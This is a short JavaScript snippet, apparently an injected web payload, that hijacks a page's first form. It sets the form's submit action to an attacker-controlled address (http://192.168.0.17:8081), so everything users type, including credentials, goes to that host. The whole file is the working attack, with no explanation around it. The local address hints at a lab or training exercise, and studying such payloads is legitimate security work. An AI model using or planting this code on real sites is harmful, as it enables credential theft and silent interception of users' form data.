const interceptar = () => {
    document.forms[0].action = "http://192.168.0.17:8081"
    return true;
}

document.forms[0].onsubmit = interceptar;

